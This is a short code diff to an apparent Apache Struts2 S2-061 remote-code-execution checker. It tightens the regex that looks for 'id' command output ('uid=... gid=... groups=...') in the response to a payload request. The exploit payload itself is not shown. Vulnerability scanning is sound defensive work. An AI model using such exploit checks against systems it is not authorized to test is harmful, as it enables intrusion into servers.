@@ -16,7 +16,7 @@ def s2_061(url):
             payload = "/?{0}=".format(p) + payload
             vurl = urllib.parse.urljoin(url, payload)
             req = requests.get(vurl, timeout=3)
-            if re.search('uid', req.text):
+            if re.search('uid=.+ gid=.+ groups=.+', req.text):
                 relsult['vulnerable'] = True
                 relsult['url'] = url
                 relsult['payload'] = vurl
